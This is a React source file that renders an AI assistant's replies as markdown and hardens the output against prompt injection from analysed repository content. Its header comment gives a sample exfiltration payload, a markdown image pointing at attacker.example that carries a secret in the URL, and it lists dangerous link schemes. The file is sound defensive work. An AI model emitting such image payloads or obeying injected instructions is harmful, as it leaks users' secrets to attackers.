import { memo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import { safeUrl } from "@/lib/safeUrl";
import { cn } from "@/lib/utils";

/**
 * Markdown for assistant replies.
 *
 * Replies are model output shaped by untrusted repository content (the
 * analysed code and any attached files), so they are treated as
 * attacker-controlled:
 *
 * - No images, ever. `![](https://attacker.example/?d=<secret>)` would load
 *   on render, with no click, and leak whatever the prompt injection put in
 *   the URL. Images render as their alt text and destination, as plain text.
 * - No raw HTML: react-markdown escapes it unless rehype-raw is added, and it
 *   is not; `skipHtml` drops it outright.
 * - Links only to http(s). Everything else (javascript:, data:, vbscript:,
 *   file:, relative paths) loses its URL and renders as plain text. Links open
 *   in a new tab with noopener/noreferrer and show their real hostname, so link
 *   text can't pass itself off as another destination.
 */
function hostnameOf(href: string): string {
  try {
    return new URL(href).hostname;
  } catch {
    return "";
  }
}

const components: Components = {
  p: ({ children }) => <p className="leading-relaxed [&:not(:first-child)]:mt-3">{children}</p>,
  h1: ({ children }) => <h3 className="mt-4 first:mt-0 text-base font-semibold">{children}</h3>,
  h2: ({ children }) => <h3 className="mt-4 first:mt-0 text-base font-semibold">{children}</h3>,
  h3: ({ children }) => <h4 className="mt-3 first:mt-0 text-sm font-semibold">{children}</h4>,
  h4: ({ children }) => <h4 className="mt-3 first:mt-0 text-sm font-semibold">{children}</h4>,
  ul: ({ children }) => <ul className="mt-2 list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="mt-2 list-decimal space-y-1 pl-5">{children}</ol>,
  li: ({ children }) => <li className="leading-relaxed">{children}</li>,
  blockquote: ({ children }) => (
    <blockquote className="mt-3 border-l-2 border-border pl-3 text-muted-foreground">{children}</blockquote>
  ),
  a: ({ href, children }) => {
    const safe = href ? safeUrl(href) : "";
    if (!safe) return <span>{children}</span>;
    const host = hostnameOf(safe);
    return (
      <a
        href={safe}
        target="_blank"
        rel="noopener noreferrer nofollow"
        title={safe}
        className="font-medium text-primary underline underline-offset-2"
      >
        {children}
        {host && <span className="ml-1 text-xs font-normal text-muted-foreground no-underline">({host})</span>}
      </a>
    );
  },
  // Never an <img>: see the note above.
  img: ({ alt, src }) => {
    const text = [alt, typeof src === "string" && src ? `(image: ${src})` : ""].filter(Boolean).join(" ");
    return text ? <span className="text-muted-foreground">{text}</span> : null;
  },
  hr: () => <hr className="my-4 border-border" />,
  // Block code: the <code> inside is reset so it doesn't get the inline chip style.
  pre: ({ children }) => (
    <pre
      tabIndex={0}
      className="mt-3 overflow-x-auto rounded-md border border-border bg-muted/60 p-3 font-mono text-xs leading-relaxed [&_code]:bg-transparent [&_code]:p-0 [&_code]:text-[inherit]"
    >
      {children}
    </pre>
  ),
  code: ({ className, children }) => (
    <code className={cn("rounded bg-muted px-1 py-0.5 font-mono text-[0.85em]", className)}>{children}</code>
  ),
  table: ({ children }) => (
    <div className="mt-3 overflow-x-auto">
      <table className="w-full border-collapse text-xs">{children}</table>
    </div>
  ),
  th: ({ children }) => <th className="border border-border px-2 py-1 text-left font-semibold">{children}</th>,
  td: ({ children }) => <td className="border border-border px-2 py-1">{children}</td>,
};

/**
 * Links are filtered to http(s) here as well as in the `a` renderer. Image
 * sources are kept (the `img` renderer prints them as text and never loads
 * them) so the reader can see what the reply tried to embed.
 */
function urlTransform(url: string, key: string): string {
  if (key === "src") return url;
  return safeUrl(url);
}

export const ChatMarkdown = memo(function ChatMarkdown({ content }: { content: string }) {
  return (
    <div className="break-words text-sm">
      <ReactMarkdown components={components} skipHtml urlTransform={urlTransform}>
        {content}
      </ReactMarkdown>
    </div>
  );
});
